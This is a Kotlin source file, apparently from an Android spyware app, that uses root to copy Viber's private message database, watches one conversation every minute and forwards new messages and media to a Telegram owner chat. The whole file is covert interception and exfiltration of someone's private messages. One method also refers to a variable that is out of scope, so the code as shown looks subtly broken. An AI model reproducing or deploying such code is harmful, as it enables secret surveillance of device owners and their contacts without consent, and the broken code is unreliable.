package com.cybermiller.guard

import android.content.Context
import android.util.Log
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone

/**
 * Scans one Viber conversation branch for new messages and forwards them to the
 * Telegram owner chat. Runs inside GuardService on the single-thread scheduler.
 *
 * Read path: root copy of viber_messages(+wal) → WAL replay → MiniSqlite pager.
 * Requires root; silently disabled if root is unavailable.
 */
object ViberMonitor {
    private const val TAG = "GuardViber"
    private const val DATE_FMT = "yyyy-MM-dd HH:mm:ss"
    private val sdf = SimpleDateFormat(DATE_FMT, Locale.ROOT).apply {
        timeZone = TimeZone.getTimeZone("UTC")
    }

    @Volatile private var running = false
    @Volatile private var lastTs = 0L

    /** First tick only records the timeline position; it does not spam backlog. */
    private var primed = false

    /** Last processed conversation row id, keyed by conversation id. */
    @Volatile private var lastIds = mutableMapOf<Long, Long>()

    fun start(ctx: Context) {
        if (running) return
        running = true
        Log.i(TAG, "viber monitor start")
        Thread {
            val appCtx = ctx.applicationContext
            while (running) {
                try { tick(appCtx) } catch (e: Throwable) {
                    Log.w(TAG, "tick failed: ${e.javaClass.simpleName}: ${e.message}")
                }
                Thread.sleep(60_000)
            }
        }.apply { isDaemon = true }.start()
    }

    fun stop() { running = false }

    private fun tick(ctx: Context) {
        if (!ViberReader.snapshotReady()) return
        // conversation id on this device = 1 (the chat with +375000000000)
        ViberReader.readConversations(ctx).orEmpty().firstOrNull { c -> c.id == 1L }
            ?.let { convo ->
                val msgs = ViberReader.readMessages(ctx, convo.id, 100) ?: return@let
                if (!primed) {
                    primed = true
                    lastTs = msgs.maxOfOrNull { it.ts } ?: 0L
                    Log.i(TAG, "primed at ts=$lastTs (${msgs.size} msgs in branch)")
                    return@let
                }
                msgs.filter { it.ts > lastTs }
                    .sortedBy { it.ts }
                    .forEach { m ->
                        forward(ctx, convo.id, m)
                        lastTs = maxOf(lastTs, m.ts)
                    }
            }
    }

    private fun forward(ctx: Context, conversationId: Long, m: ViberReader.Msg) {
        val dir = if (m.incoming) "⬅️" else "➡️"
        val time = sdf.format(Date(m.ts))
        val num = (if (m.participantId != 0L) ViberReader.participantNumber(ctx, m.participantId) else null)
            ?: "+375000000000"
        // Media captions in Viber's body are internal provider URIs — useless as text.
        val isMedia = m.mime != 0
        val body = if (isMedia && m.body.startsWith("content://")) "" else m.body
        val caption = buildString {
            append("$dir <b>Viber</b> <code>$time</code>\n")
            append("от ${num}\n")
            append("<i>${body.take(1000)}</i>")
        }.trim()

        if (isMedia) {
            val file = ViberReader.exportMedia(ctx, m.mediaUri, m.mediaFileName, m.mediaSize)
            if (file != null) {
                TelegramClient.sendViberAlert(ctx, convo.id, num, caption, file)
                Log.i(TAG, "forwarded viber media #${m.id} mime=${m.mime} -> ${file.name}")
                return
            }
            TelegramClient.sendText("$caption\n\n<i>медиа недоступно (mime=${m.mime})</i>")
        } else {
            TelegramClient.sendViberAlert(ctx, convo.id, num, caption)
        }
        Log.i(TAG, "forwarded viber msg #${m.id} incoming=${m.incoming}")
    }
}